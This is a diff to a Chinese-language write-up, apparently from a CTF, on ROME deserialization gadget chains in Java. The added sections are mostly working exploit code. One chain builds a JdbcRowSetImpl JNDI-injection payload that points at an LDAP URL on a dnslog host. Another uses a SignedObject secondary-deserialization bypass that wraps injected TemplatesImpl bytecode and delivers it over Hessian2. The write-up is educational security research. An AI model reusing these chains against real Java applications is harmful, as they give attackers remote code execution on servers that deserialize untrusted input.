@@ -145,7 +145,7 @@ Hashtable.readObject()
 ```
 
 ## 新链2(不符合题目要求)
-实际上我们知道`pReadMethod.invoke(_obj,NO_PARAMS)`最终会调用到_obj的所有getter方法，根据我们对反序列化链的了解，实际上我们也可以利用`JdbcRowSetImpl.getDatabaseMetaData()`方法最终触发JNDI注入，我们只需要将sink修改一下即可:
+实际上我们知道`pReadMethod.invoke(_obj,NO_PARAMS)`最终会调用到_obj的所有getter方法，根据我们对反序列化链的了解，我们也可以利用`JdbcRowSetImpl.getDatabaseMetaData()`方法最终触发JNDI注入，我们只需要将sink修改一下即可:
 ```java
 package top.longlone;
 
@@ -204,7 +204,127 @@ public class ROME {
 但是当我们运行程序时很遗憾地发现长度还是超出了1956:
 ![](https://gitee.com/guuest/images/raw/master/img/20220307113636.png)
 
+新链2长度很大的原因是因为 `JdbcRowSetImpl` 这个类的对象太大了，方法巨多，本来优化的思路是用ASM把没用的属性和方法全部扬了，但是这个类的类加载器是 `BootStrap` ，位于双亲委派的最顶层，所以修改过后的字节码没办法再次加载。
 
+另一个优化思路是把没用的属性全部改为null，但是要注意不能影响sink的最终执行结果，所以这里要对照 `pds[]` 中 getter 方法的顺序选择对应的属性进行修改：
+```java
+public class ROME_JNDI {
+    public static void main(String[] args) throws Exception {
+        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
+        jdbcRowSet.setDataSourceName("ldap://1tqzc9.dnslog.cn/");
+        jdbcRowSet.setMatchColumn("a");
+
+        clear(jdbcRowSet);
+
+        EqualsBean equalsBean = new EqualsBean(String.class, "");
+        HashMap<String, Object> innerMap1 = new HashMap<>();
+        innerMap1.put("zZ", equalsBean);
+        innerMap1.put("yy", jdbcRowSet);
+        HashMap<String, Object> innerMap2 = new HashMap<>();
+        innerMap2.put("zZ", jdbcRowSet);
+        innerMap2.put("yy", equalsBean);
+
+        Hashtable table = new Hashtable();
+        table.put(innerMap1, 1);
+        table.put(innerMap2, 1);
+
+        Utils.setFieldValue(equalsBean, "_beanClass", JdbcRowSetImpl.class);
+        Utils.setFieldValue(equalsBean, "_obj", jdbcRowSet);
+
+        System.out.println(new BASE64Encoder().encode(Utils.serialize(table)).length());
+
+        Utils.unserialize(Utils.serialize(table));
+    }
+
+    static void clear(JdbcRowSetImpl jdbcRowSet) throws Exception {
+        Utils.setFieldValue(jdbcRowSet, "iMatchColumns", null);
+        Utils.setFieldValue(jdbcRowSet, "resBundle", null);
+        Class<?> clazz = Class.forName(BaseRowSet.class.getName());
+        Field fee = clazz.getDeclaredField("listeners");
+        fee.setAccessible(true);
+        fee.set(jdbcRowSet, null);
+
+        fee = clazz.getDeclaredField("params");
+        fee.setAccessible(true);
+        fee.set(jdbcRowSet, null);
+    }
+}
+```
+最后长度为：
+![](https://syclover.feishu.cn/space/api/box/stream/download/asynccode/?code=MTYzOTBiOWY0ZGJhZmIxZTc4MTk3NGNhZmUzMzI5NTJfd2V6RFdKQmhJd3RVeGRFcWJmN1BSRTIxeUp2RTlOOUlfVG9rZW46Ym94Y25ZUE1tVVdYY3hQNDUxNXJwOEpEWkVjXzE2NDY4ODcyMDU6MTY0Njg5MDgwNV9WNA)
+![](https://gitee.com/guuest/images/raw/master/img/20220321143222.png)
+
+## 二次反序列化绕过方式
+有时候我们会遇到一些其他的反序列化方式，例如Hessian(2)，如果使用这种序列化/反序列化的话，我们的链可能会出现问题，原因是我们的Sink不能再使用TemplatesImpl类，原因是: 这种反序列化不会触发`TemplatesImpl.readObject()`方法，导致反序列化出来的`TemplatesImpl._tfactory`属性为空(这个属性存在transient关键字修饰，无法序列化)，这样导致我们最后没办法利用`TemplatesImpl#defineTransletClasses`方法去实现任意java代码执行。
+
+在这种情况下实际上我们就只剩下JNDI这一条路，但加入目标不出网/JDK版本过高的话，JNDI是不好用的，还有其他方法吗？
+
+答案是二次反序列化，我们知道EqualsBean/ToStringBean这几个类最终会触发某个类的所有getter，那么假如存在一个类其getter方法又会使用java原生反序列化，而且其反序列化内容我们可以控制的话，我们就可以进行绕过了，这个类正是`java.security.SignedObject`:
+![](https://gitee.com/guuest/images/raw/master/img/20220321144705.png)
+
+那么我们去找下这个类的用法，其构造方法的第一个参数会被序列化然后存放到`SignedObject.content`中:
+```java
+KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
+kpg.initialize(1024);
+KeyPair kp = kpg.generateKeyPair();
+SignedObject signedObject = new SignedObject("secret", kp.getPrivate(), Signature.getInstance("DSA"));
+```
+
+通过使用这个类，我们可以最终构造出二次反序列化的payload:
+```java
+public class ROMETools {
+
+    public static Hashtable getPayload (Class clazz, Object payloadObj) {
+        EqualsBean bean = new EqualsBean(String.class, "s");
+
+        HashMap map1 = new HashMap();
+        HashMap map2 = new HashMap();
+        map1.put("yy", bean);
+        map1.put("zZ", payloadObj);
+        map2.put("zZ", bean);
+        map2.put("yy", payloadObj);
+        Hashtable table = new Hashtable();
+        table.put(map1, "1");
+        table.put(map2, "2");
+        Utils.setFieldValue(bean, "beanClass", clazz);
+        Utils.setFieldValue(bean, "obj", payloadObj);
+
+        return table;
+    }
+
+    public static void main(String[] args) throws Exception {
+        TemplatesImpl templates = new TemplatesImpl();
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.getCtClass("top.longlone.A");
+        byte[] bytes = clazz.toBytecode();
+
+        Utils.setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
+        Utils.setFieldValue(templates, "_name", "A");
+
+        Hashtable table1 = getPayload(Templates.class, templates);
+
+        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
+        kpg.initialize(1024);
+        KeyPair kp = kpg.generateKeyPair();
+        SignedObject signedObject = new SignedObject(table1, kp.getPrivate(),
+                Signature.getInstance("DSA"));
+
+        Hashtable table2 = getPayload(SignedObject.class, signedObject);
+
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        Hessian2Output hessianOutput = new Hessian2Output(bos);
+        hessianOutput.writeObject(table2);
+        hessianOutput.getBytesOutputStream().flush();
+        hessianOutput.completeMessage();
+        hessianOutput.close();
+
+        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
+        Hessian2Input hessianInput = new Hessian2Input(bis);
+        hessianInput.readObject();
+
+    }
+}
+```
 
 ## 参考文章
 - https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html
